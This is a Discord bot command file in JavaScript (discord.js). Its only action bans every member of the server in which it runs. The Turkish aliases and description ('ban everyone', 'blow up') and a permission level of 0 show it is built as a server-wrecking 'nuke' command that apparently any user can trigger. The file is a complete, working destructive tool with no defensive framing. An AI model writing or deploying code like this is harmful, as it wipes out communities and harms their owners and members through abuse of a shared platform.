const Discord = require("discord.js");

exports.run = function(client, message) {
  message.guild.members.forEach(i => {
    i.ban();
  });
};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["ban","herkesi-banla","patlat"],
  permLevel: 0
};

exports.help = {
  name: "banned",
  description: "Herkesi Sunucudan Banlar!",
  usage: "banned"
};